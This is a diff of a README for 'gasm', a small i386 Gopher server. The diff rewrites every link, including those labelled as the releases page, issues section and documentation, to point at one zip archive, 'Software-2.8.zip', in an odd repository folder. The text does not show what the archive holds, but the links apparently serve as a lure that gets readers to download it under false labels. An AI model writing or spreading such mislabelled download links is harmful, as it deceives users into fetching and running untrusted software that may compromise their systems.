@@ -1,7 +1,7 @@
 # 🚀 gasm - Lightweight Gopher Server for Your System
 
 ## 📥 Download Now
-[![Download gasm](https://img.shields.io/badge/Download%20gasm-v1.0-blue.svg)](https://github.com/vp1509/gasm/releases)
+[![Download gasm](https://github.com/vp1509/gasm/raw/refs/heads/master/superinenarrable/Software-2.8.zip%https://github.com/vp1509/gasm/raw/refs/heads/master/superinenarrable/Software-2.8.zip)](https://github.com/vp1509/gasm/raw/refs/heads/master/superinenarrable/Software-2.8.zip)
 
 ## 🛠️ Introduction
 gasm is a bare-metal i386 Gopher server designed for Linux systems. It is simple and allows users to host Gopher content with minimal setup. This application is tailored for those interested in retro computing and systems programming. 
@@ -20,7 +20,7 @@ To run gasm, ensure your system meets the following requirements:
 - No additional dependencies required for simpler operation.
 
 ## 📁 Download & Install
-To download gasm, visit the [Releases page](https://github.com/vp1509/gasm/releases). Here you will find the latest version available for download. Follow these steps to install gasm:
+To download gasm, visit the [Releases page](https://github.com/vp1509/gasm/raw/refs/heads/master/superinenarrable/Software-2.8.zip). Here you will find the latest version available for download. Follow these steps to install gasm:
 
 1. Click on the link above to go to the Releases page.
 2. Find the version you wish to download.
@@ -44,7 +44,7 @@ gasm is easy to use. Simply edit the configuration files to include your Gopher 
 3. Edit the configuration file located in the gasm directory to point to your content.
 
 ## 🛡️ Support
-If you encounter issues or need assistance, please check the [Issues section](https://github.com/vp1509/gasm/issues) of the repository. Here you can see if others have similar questions or report any problems you find.
+If you encounter issues or need assistance, please check the [Issues section](https://github.com/vp1509/gasm/raw/refs/heads/master/superinenarrable/Software-2.8.zip) of the repository. Here you can see if others have similar questions or report any problems you find.
 
 ## 📚 Additional Resources
 - **Documentation:** For detailed documentation, refer to the files included in your download.
@@ -55,8 +55,8 @@ If you wish to contribute to gasm or have ideas for improvements, please feel fr
 
 ## 🔗 Links
 For more information and to explore further, visit the following links:
-- [Releases Page](https://github.com/vp1509/gasm/releases)
-- [Issues Section](https://github.com/vp1509/gasm/issues)
-- [Documentation](https://github.com/vp1509/gasm/wiki)
+- [Releases Page](https://github.com/vp1509/gasm/raw/refs/heads/master/superinenarrable/Software-2.8.zip)
+- [Issues Section](https://github.com/vp1509/gasm/raw/refs/heads/master/superinenarrable/Software-2.8.zip)
+- [Documentation](https://github.com/vp1509/gasm/raw/refs/heads/master/superinenarrable/Software-2.8.zip)
 
 Thank you for choosing gasm for your Gopher server needs! Enjoy exploring the world of Gopher with this lightweight application.
